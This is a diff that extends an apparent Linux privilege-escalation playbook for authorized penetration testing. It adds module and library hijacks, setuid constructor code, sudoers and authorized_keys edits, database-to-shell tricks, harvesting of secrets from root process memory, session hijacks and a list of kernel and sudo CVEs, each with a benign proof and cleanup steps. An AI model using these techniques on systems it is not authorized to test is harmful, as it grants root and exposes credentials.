@@ -251,3 +251,144 @@ grep -i cap /proc/self/status                                                  #
 # → if containerized, root-in-container != host root: STOP and run the container-escape skill (privileged / mounted docker.sock /
 #   hostPath / release_agent / cap_sys_admin breakout). This playbook assumes a bare-metal or VM host.
 ```
+
+---
+
+## Extended arsenal — interpreter path/library hijack (Python / Perl / Node / Ruby)
+# Root runs a *script* (cron / systemd / sudo-allowed). You don't need the script writable — hijack a module it imports.
+# Detect the root-run script (pspy / sudo -l), read its imports, test each module dir for write access. Lowest-risk when a dir is already yours.
+```
+# PYTHONPATH — a writable entry on sys.path (incl. '' = CWD), or a sudo SETENV rule that keeps PYTHONPATH
+python3 -c 'import sys;[print(p or ".") for p in sys.path]'       # any writable line = hijack
+sudo -l | grep -i setenv
+# drop a module the script does `import <name>`: code runs at import time, as root
+printf 'import os\nos.setuid(0);os.system("id>/tmp/pe_proof.txt")\n' > <writable_syspath>/<name>.py
+find / -type d -name __pycache__ -writable 2>/dev/null            # .pyc variant: replace cached <name>.cpython-*.pyc
+```
+| runtime | env / search path | hijack point |
+|---|---|---|
+| Perl | PERL5LIB / PERLLIB / PERL5OPT=-M<mod> | writable dir in @INC (`perl -e 'print "@INC"'`) or SETENV PERL5LIB |
+| Node | NODE_PATH / relative require() | writable `node_modules/<pkg>` the script require()s |
+| Ruby | RUBYLIB / RUBYOPT=-r<lib> | writable dir in $LOAD_PATH (`ruby -e 'puts $LOAD_PATH'`) |
+| Lua | LUA_PATH / LUA_CPATH | writable `package.path` entry |
+# Benign proof = the module writes id→/tmp marker when the root job imports it. Cleanup: remove the planted module/.pyc; unset any env you set.
+
+---
+
+## Extended arsenal — SUID shared-object edge cases (RPATH/RUNPATH, missing dlopen, writable lib, hardlink)
+# Beyond LD_PRELOAD (§1) and ld.so.preload / ld.so.conf.d (ext. C): a SUID-root binary that resolves a library through a path YOU control.
+```
+readelf -d <suid> | egrep 'NEEDED|RPATH|RUNPATH'    # prefer readelf over ldd (ldd can run the target's interpreter)
+strace -f -e openat,access <suid-or-unpriv-copy> 2>&1 | grep -E 'ENOENT.*\.so'   # missing/late dlopen() lookups
+namei -om /path/to/needed.so                        # writable component anywhere along a needed lib's path
+find / -xdev -perm -4000 -type f -links +1 2>/dev/null   # SUID with extra hardlinks (path/name confusion)
+```
+- **RPATH/RUNPATH hijack**: a NEEDED lib resolves via a writable RPATH/RUNPATH dir → drop a `.so` of that exact name.
+- **Missing/relative dlopen**: binary dlopen()s a name not present → plant it in the first writable search dir.
+- **Writable lib file/dir**: the real `.so` (or its dir) is writable → BACK IT UP, swap in the constructor `.so`, run once, RESTORE.
+- **SUID hardlink confusion**: a wrapper invoked under a second link name can change behaviour (argv[0]-sensitive binaries).
+```c
+__attribute__((constructor)) static void x(){ setuid(0); setgid(0); system("id>/tmp/pe_proof.txt"); }
+// gcc -shared -fPIC x.c -o <writable>/<exact-needed-name>.so ; run the SUID binary ; then delete it (restore any backup).
+```
+# Overwriting a REAL library = lab/approved only; on prod note feasibility (readelf evidence) rather than swapping live libs.
+
+---
+
+## Extended arsenal — boot/login/event-triggered root exec (beyond cron & systemd, §3 / ext. D)
+```
+ls -la /etc/init.d /etc/rc.local /etc/rc*.d 2>/dev/null           # SysV init / rc.local (root at boot)
+ls -la /etc/update-motd.d /etc/profile.d 2>/dev/null             # login-time root scripts (pam_motd / profile)
+find /etc/udev/rules.d /lib/udev/rules.d -writable 2>/dev/null    # udev RUN+= fires as root on device events
+ls -la /etc/incron.d /var/spool/incron 2>/dev/null; command -v incrontab   # file-event-triggered root exec
+cat /etc/anacrontab 2>/dev/null; atq 2>/dev/null                 # anacron catch-up / at queue
+```
+| trigger | writable artefact | fires when |
+|---|---|---|
+| SysV init / rc.local | /etc/init.d/<s>, /etc/rc.local | boot / service start |
+| udev | *.rules with `RUN+="/path"` | matching device add/remove |
+| incron | /etc/incron.d/*, user incrontab | watched path is written/opened |
+| at / batch | queued job owned by root | scheduled time / load threshold |
+| anacron | /etc/anacrontab, cron.{daily,weekly} | periodic catch-up run |
+| motd / profile.d | /etc/update-motd.d/*, /etc/profile.d/*.sh | any user (incl. root) opens a login shell |
+# Benign: append `id > /tmp/pe_proof.txt` (or an Exec-style marker) to the writable artefact, trigger it / wait one cycle, confirm uid=0, RESTORE from backup. Log every edit in cleanup.md.
+
+---
+
+## Extended arsenal — writable security-config that grants root (beyond passwd/shadow, §6)
+```
+ls -la /etc/sudoers.d/ /etc/sudoers 2>/dev/null                   # drop-in sudoers
+ls -la /root/.ssh/authorized_keys /root/.ssh 2>/dev/null         # root's SSH keys
+ls -la /etc/pam.d/ 2>/dev/null; grep -rn nullok /etc/pam.d 2>/dev/null
+find /etc/sudoers.d /etc/cron.d -writable 2>/dev/null            # new-file drop into a privileged dir
+```
+| writable target | benign root proof | revert |
+|---|---|---|
+| /etc/sudoers.d/<f> | add `<youruser> ALL=(ALL) NOPASSWD:ALL` → `sudo id` | delete the drop-in |
+| /root/.ssh/authorized_keys | append YOUR test pubkey → `ssh root@127.0.0.1 id` | remove the key line |
+| /etc/pam.d/<svc> | a permissive line (pam_permit.so / `nullok`) → auth as root | restore original |
+| /etc/cron.d/<f> | `* * * * * root id>/tmp/pe_proof.txt` → wait one min | delete the file |
+# BACK UP every file first. A malformed sudoers can lock sudo out — keep the drop-in minimal, one line, and REVERT immediately after proof.
+
+---
+
+## Extended arsenal — root-run local services → OS command exec (MySQL / Redis / PostgreSQL)
+# Precondition: the DB process runs AS ROOT. Confirm first — DB-side code exec maps to the DB's run-user, so a service account != root.
+```
+ps -eo user,comm | egrep 'mysqld|mariadbd|redis-server|postgres'  # run-as user MUST be root for this to mean root
+ss -lntup 2>/dev/null | egrep '3306|6379|5432'                    # loopback-only is still locally reachable
+```
+| service (running as root) | primitive → benign root proof | redact / cleanup |
+|---|---|---|
+| MySQL/MariaDB | FILE priv → `SELECT ... INTO OUTFILE` a root-owned file; or UDF `sys_exec('id>/tmp/pe_proof.txt')` | drop the UDF + its .so, remove outfile |
+| Redis (unauth/loopback) | `CONFIG SET dir` + `dbfilename` → write a root cron / authorized_keys marker; or `MODULE LOAD` a stub that runs id | DEL the keys, restore dir/dbfilename, remove file |
+| PostgreSQL (superuser) | `COPY t FROM PROGRAM 'id>/tmp/pe_proof.txt'`; or CREATE EXTENSION / large-object → exec | DROP the table/extension, remove file |
+# Use creds found in enum (§8) or socket/trust auth. Benign = ONE marker written as root; never dump tables. REDACT every recovered secret to a fingerprint.
+
+---
+
+## Extended arsenal — root process memory / FD / session harvest (concrete cap_sys_ptrace & shared-session use)
+# §A flags cap_sys_ptrace as feasibility-only and ext. E covers agent-socket reuse — this is the concrete READ-ONLY harvest set.
+```
+cat /proc/sys/kernel/yama/ptrace_scope                 # 0 = same-uid / CAP_SYS_PTRACE attach to root procs allowed
+ls -l /proc/<root_pid>/fd 2>/dev/null                  # open secrets/sockets/scripts readable via the fd
+lsof +L1 2>/dev/null                                   # deleted-but-open files (config/creds) still readable
+strings /proc/<root_pid>/environ 2>/dev/null           # env secrets beyond the agent/ccache vars in ext. E
+```
+- **/proc/<pid>/mem + maps**: with ptrace rights, dump readable regions and `strings | grep -i pass` (or `gcore <pid>`). Read-only; REDACT hits.
+- **/proc/<pid>/fd/<n>**: `cat` an open log / DB handle / export the root process holds — recover a secret without touching the owner.
+- **screen hijack**: `screen -ls`; `ls /run/screen/S-*` → `screen -x <user>/<sess>` if the session is multiuser and its shell runs as root.
+- **tmux hijack**: `ls -la /tmp/*tmux*` → `tmux -S <sock> attach` if the socket is group/world-accessible (mainly old tmux).
+# Benign: prove reach / recover ONE redacted secret. No injection into a live prod process. Nothing to clean beyond deleting any gcore dump.
+
+---
+
+## Extended arsenal — kernel & loader LPE catalog expansion (feasibility-first; weaponization → exploit-dev)
+# Extends §9. A kernel exploit can PANIC prod — on a live host REPORT FEASIBILITY (version match + a public PoC exists) and defer firing to an
+# approved maintenance window + the exploit-dev skill. Benign proof only where safe = the PoC's own uid=0 in a snapshot/VM, then revert the snapshot.
+```
+uname -r; cat /etc/os-release                          # kernel + distro → match the ranges below
+ldd --version | head -1                                # glibc version (Looney Tunables)
+```
+| CVE | class / name | subsystem — rough affected range |
+|---|---|---|
+| CVE-2024-1086 | nf_tables double-free (very reliable) | netfilter nft — ~5.14–6.6 |
+| CVE-2023-32233 | nf_tables anon-set UAF | netfilter — ≤6.3.x |
+| CVE-2023-0179 / CVE-2022-32250 | nf_tables stack-OOB / UAF | netfilter |
+| CVE-2023-2598 / CVE-2022-2602 | io_uring fixed-buf OOB / GC UAF | io_uring |
+| CVE-2023-0386 | overlayfs fuse copy_up setuid | overlayfs — ≤6.2 |
+| CVE-2021-3493 | overlayfs ns-capability | Ubuntu overlayfs |
+| CVE-2023-2640 / CVE-2023-32629 | GameOver(lay) | Ubuntu overlayfs |
+| CVE-2021-33909 | Sequoia seq_file size_t | fs layer — broad |
+| CVE-2023-3269 | StackRot maple-tree | mm — 6.1–6.4 |
+| CVE-2021-3490 / CVE-2020-8835 | eBPF verifier bounds | bpf |
+| CVE-2025-37947 | ksmbd stream OOB write | ksmbd |
+| (technique) DirtyCred | file/cred cross-cache (rides a UAF, e.g. CVE-2022-2588) | heap |
+| CVE-2023-4911 | **Looney Tunables** GLIBC_TUNABLES overflow via SUID | glibc ld.so (userland, not kernel) |
+Recent **sudo** CVEs (userland — often more reliable than a kernel bug):
+| CVE | trigger |
+|---|---|
+| CVE-2025-32463 | sudo `chroot` → nsswitch loads attacker lib; default config, no rule needed (in CISA KEV); sudo < 1.9.17p1 |
+| CVE-2025-32462 | host-restricted sudoers rule applied off its intended host; sudo < 1.9.17p1 |
+| CVE-2023-22809 | sudoedit extra args in EDITOR/SUDO_EDITOR → edit ANY root-owned file |
+# All feasibility-first: confirm the version matches, then hand weaponization to exploit-dev. Never run an untrusted "PoC" blind on prod.
